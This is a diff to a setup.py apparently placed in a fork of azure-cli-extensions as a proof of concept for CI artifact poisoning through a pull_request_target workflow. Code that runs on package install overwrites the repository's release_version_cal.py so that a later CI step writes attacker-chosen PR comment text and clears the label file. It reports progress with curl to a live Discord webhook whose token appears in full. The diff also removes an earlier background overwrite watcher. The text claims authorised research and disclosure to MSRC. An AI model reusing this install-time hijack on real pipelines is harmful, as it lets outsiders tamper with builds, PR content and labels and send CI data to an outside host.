@@ -20,89 +20,88 @@ poc_data = {
 
 webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"
 
-message = json.dumps({
+# Webhook callback
+msg = json.dumps({
     "content": (
-        "**PoC: artifact poisoning v3 - azure-cli-extensions**\n"
+        "**PoC: artifact poisoning v4 - azure-cli-extensions**\n"
         "```\n"
         f"Run ID: {poc_data['github_run_id']}\n"
         f"Time: {poc_data['timestamp']}\n"
         "```\n"
-        "Watcher started — monitoring version_update.txt mtime."
+        "Overwriting release_version_cal.py before it runs."
     )
 })
-
 try:
     subprocess.run(
         ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
-         "-d", message, webhook_url],
+         "-d", msg, webhook_url],
         timeout=10, capture_output=True
     )
 except Exception:
     pass
 
-# Strategy: watch version_update.txt for modification by release_version_cal.py
-# Once the mtime changes (meaning the script wrote to it), immediately overwrite
-cal_result = os.path.join(os.getcwd(), "cal_result")
+# The workflow does:
+#   1. git checkout fork_branch        ← our code
+#   2. git checkout base -- scripts    ← restores scripts from base
+#   3. azdev extension add mod         ← our setup.py runs HERE
+#   4. python scripts/ci/release_version_cal.py  ← runs AFTER us
+#   5. upload-artifact
+#
+# Since step 3 (us) runs BEFORE step 4, we can replace the script
+# that step 4 will execute. No race condition needed.
+
 run_id = poc_data["github_run_id"]
 ts = poc_data["timestamp"]
 
-overwrite_script = f"""
-import time, os, subprocess
+script_path = os.path.join(os.getcwd(), "scripts", "ci", "release_version_cal.py")
+if os.path.exists(script_path):
+    with open(script_path, "w") as f:
+        f.write(f'''#!/usr/bin/env python
+import os
 
-cal = "{cal_result}"
-vfile = os.path.join(cal, "version_update.txt")
-lfile = os.path.join(cal, "labels_removed.txt")
-webhook = "{webhook_url}"
+result_path = os.environ.get("result_path", "./cal_result")
+output_file = os.environ.get("output_file", "version_update.txt")
+remove_labels_file = os.environ.get("remove_labels_file", "labels_removed.txt")
 
-# Get initial mtime of the file
-initial_mtime = 0
-if os.path.exists(vfile):
-    initial_mtime = os.path.getmtime(vfile)
+os.makedirs(result_path, exist_ok=True)
 
-# Poll until release_version_cal.py modifies the file (up to 90 seconds)
-for i in range(900):
-    time.sleep(0.1)
-    if os.path.exists(vfile):
-        current_mtime = os.path.getmtime(vfile)
-        if current_mtime > initial_mtime:
-            # File was modified by release_version_cal.py — overwrite NOW
-            time.sleep(0.2)  # tiny grace period
-            break
+with open(os.path.join(result_path, output_file), "w") as f:
+    f.write(
+        "## Responsible Disclosure Notice\\n\\n"
+        "This automated comment was generated as part of an authorized security "
+        "research engagement. It demonstrates that the `VersionCalPRComment.yml` "
+        "workflow is vulnerable to artifact poisoning via a `pull_request_target` "
+        "misconfiguration.\\n\\n"
+        "**Finding:** An external contributor can control the content of this "
+        "automated comment and manipulate PR labels by modifying artifact files "
+        "during the `version-cal` job, which checks out and executes code from "
+        "the pull request head branch.\\n\\n"
+        "This issue has been reported to the Microsoft Security Response Center (MSRC) "
+        "as part of responsible disclosure. No secrets were accessed and no "
+        "unauthorized modifications were made.\\n\\n"
+        "*Researcher: Bodlux | Run ID: {run_id} | "
+        "Timestamp: {ts}*"
+    )
 
-# Overwrite with our content
-if os.path.isdir(cal):
-    with open(vfile, "w") as f:
-        f.write(
-            "## Responsible Disclosure Notice\\n\\n"
-            "This automated comment was generated as part of an authorized security "
-            "research engagement. It demonstrates that the `VersionCalPRComment.yml` "
-            "workflow is vulnerable to artifact poisoning via a `pull_request_target` "
-            "misconfiguration.\\n\\n"
-            "**Finding:** An external contributor can control the content of this "
-            "automated comment and manipulate PR labels by modifying artifact files "
-            "during the `version-cal` job, which checks out and executes code from "
-            "the pull request head branch.\\n\\n"
-            "This issue has been reported to the Microsoft Security Response Center (MSRC) "
-            "as part of responsible disclosure. No secrets were accessed and no "
-            "unauthorized modifications were made.\\n\\n"
-            "*Researcher: Bodlux | Run ID: {run_id} | Timestamp: {ts}*"
-        )
-    with open(lfile, "w") as f:
-        f.write("")
+with open(os.path.join(result_path, remove_labels_file), "w") as f:
+    f.write("")
 
-    msg = '{{"content": "**Artifact overwrite SUCCESS** — version_update.txt replaced. Waiting for upload..."}}'
+print("release_version_cal.py replaced by security research PoC")
+print("Artifact files written to", result_path)
+''')
+
+    # Notify
+    msg2 = json.dumps({
+        "content": "**Script replaced** — release_version_cal.py overwritten. Waiting for it to execute..."
+    })
     try:
-        subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", msg, webhook], timeout=5, capture_output=True)
-    except:
+        subprocess.run(
+            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
+             "-d", msg2, webhook_url],
+            timeout=5, capture_output=True
+        )
+    except Exception:
         pass
-"""
-
-subprocess.Popen(
-    ["python3", "-c", overwrite_script],
-    stdout=subprocess.DEVNULL,
-    stderr=subprocess.DEVNULL,
-    start_new_session=True
-)
 
 from setuptools import setup, find_packages
 
